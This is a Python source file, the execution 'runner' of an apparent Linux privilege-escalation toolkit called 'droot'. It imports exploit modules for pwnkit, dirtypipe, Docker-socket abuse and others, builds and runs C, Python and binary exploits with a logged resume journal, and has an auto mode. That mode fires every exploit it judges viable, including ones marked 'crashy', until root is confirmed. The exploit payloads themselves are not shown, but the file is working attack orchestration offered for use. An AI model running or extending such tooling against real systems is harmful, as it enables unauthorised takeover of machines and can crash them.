"""
The runner: safe execution with hard timeouts, canary root verification and
a resume journal that survives kernel panics.

droot -- Linux LPE toolkit. Author: baba01hacker.
"""
from __future__ import annotations

import importlib
import json
import os
import time

from . import registry
from .exploits import base, binaries, csource, pysource

NATIVE_MODULES = {
    "pwnkit": "droot.exploits.pwnkit",
    "dirtypipe": "droot.exploits.dirtypipe",
    "copyfail": "droot.exploits.copyfail",
    "dockersock": "droot.exploits.dockersock",
    "userspace": "droot.exploits.userspace",
}


class Runner:
    def __init__(self, state_dir=None, cache_dir=None):
        self.state_dir = state_dir or os.path.expanduser("~/.droot")
        self.cache_dir = cache_dir or os.path.join(self.state_dir, "cache")
        os.makedirs(self.state_dir, exist_ok=True)
        os.makedirs(self.cache_dir, exist_ok=True)
        os.makedirs(os.path.join(self.state_dir, "work"), exist_ok=True)
        os.makedirs(os.path.join(self.state_dir, "logs"), exist_ok=True)
        self.state_file = os.path.join(self.state_dir, "state.json")
        self._profile = None

    # -- state journal -------------------------------------------------------
    def load_state(self):
        try:
            with open(self.state_file) as f:
                return json.load(f)
        except (OSError, ValueError):
            return {"attempts": [], "root": False}

    def save_attempt(self, spec, verdict, result):
        st = self.load_state()
        st["attempts"].append({
            "id": spec.id, "cve": spec.cve, "name": spec.name,
            "verdict": verdict.to_dict(), "root": bool(result and result.root),
            "detail": result.detail if result else "",
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S"),
        })
        if result and result.root:
            st["root"] = True
        with open(self.state_file, "w") as f:
            json.dump(st, f, indent=2)
        return st

    # -- context ---------------------------------------------------------------
    def context(self, timeout):
        ctx = base.RunContext(self.state_dir, timeout)
        for p in (ctx.marker, ctx.rootshell):
            try:
                os.unlink(p)
            except OSError:
                pass
        return ctx

    # -- execution -------------------------------------------------------------
    def run(self, spec, profile, verdict=None, dry_run=False):
        """Execute one exploit. Returns RunResult."""
        self._profile = profile
        if verdict is None:
            verdict = registry.evaluate(spec, profile)
        if dry_run:
            return base.RunResult(True, False,
                                  "dry-run: %s is %s" % (spec.id, verdict.status))
        if verdict.status != "VULNERABLE":
            return base.RunResult(False, False,
                                  "not viable: %s" % verdict.status)

        log_path = os.path.join(
            self.state_dir, "logs",
            "%s-%s.log" % (time.strftime("%Y%m%d-%H%M%S"), spec.id))
        ctx = self.context(spec.timeout)

        def log(line):
            ctx.log(line)
            with open(log_path, "a") as f:
                f.write(line + "\n")

        log("[droot] %s (%s) risk=%s reliability=%d"
            % (spec.name, spec.cve or "-", spec.risk, spec.reliability))
        log("[droot] workdir=%s timeout=%ds" % (ctx.workdir, spec.timeout))

        try:
            if spec.kind == "native":
                result = self._run_native(spec, ctx, log)
            elif spec.kind == "csource":
                result = self._run_csource(spec, ctx, log)
            elif spec.kind == "pysource":
                result = self._run_pysource(spec, ctx, log)
            elif spec.kind == "binary":
                result = self._run_binary(spec, ctx, log)
            else:
                result = base.RunResult(False, False,
                                        "unknown kind %r" % spec.kind)
        except Exception as e:  # never let one exploit kill the run
            result = base.RunResult(False, False, "runner error: %s" % e)
            log("[droot] runner error: %s" % e)

        log("[droot] result: ok=%s root=%s %s"
            % (result.ok, result.root, result.detail))
        self.save_attempt(spec, verdict, result)
        result.log = log_path
        return result

    def _run_native(self, spec, ctx, log):
        mod = importlib.import_module(NATIVE_MODULES[spec.module])
        cls = None
        for name in dir(mod):
            obj = getattr(mod, name)
            if isinstance(obj, type) and issubclass(obj, base.NativeExploit) \
                    and obj is not base.NativeExploit and getattr(obj, "id", None) == spec.id:
                cls = obj
                break
        if cls is None:
            return base.RunResult(False, False,
                                  "native module %s has no class for %s"
                                  % (spec.module, spec.id))
        instance = cls()
        result = instance.run(self._profile, ctx)
        if result.log:
            for line in (result.log or "").splitlines():
                log(line)
        return result

    def _run_csource(self, spec, ctx, log):
        binary, err = csource.build(spec, self.cache_dir)
        if not binary:
            log("[droot] build failed: %s" % err)
            return base.RunResult(False, False, "build failed: %s" % err)
        log("[droot] built %s" % binary)
        return csource.run(spec, binary, ctx, log)

    def _run_pysource(self, spec, ctx, log):
        return pysource.run(spec, ctx, log)

    def _run_binary(self, spec, ctx, log):
        return binaries.run(spec, ctx, log)

    # -- auto mode --------------------------------------------------------------
    def auto(self, profile, max_risk="crashy", allow_risky=False, top=None):
        """Run every viable exploit in ranked order until root is confirmed."""
        order = {"safe": 0, "low": 1, "medium": 2, "crashy": 3}
        cutoff = order.get(max_risk, 3)
        candidates = []
        for spec in registry.REGISTRY:
            verdict = registry.evaluate(spec, profile)
            if verdict.status != "VULNERABLE":
                continue
            if order.get(spec.risk, 3) > cutoff and not allow_risky:
                continue
            candidates.append((verdict.score, spec, verdict))
        candidates.sort(key=lambda t: -t[0])
        if top:
            candidates = candidates[:top]

        results = []
        for score, spec, verdict in candidates:
            if self.load_state().get("root"):
                break
            result = self.run(spec, profile, verdict)
            results.append((spec, verdict, result))
            if result.root:
                break
        return results
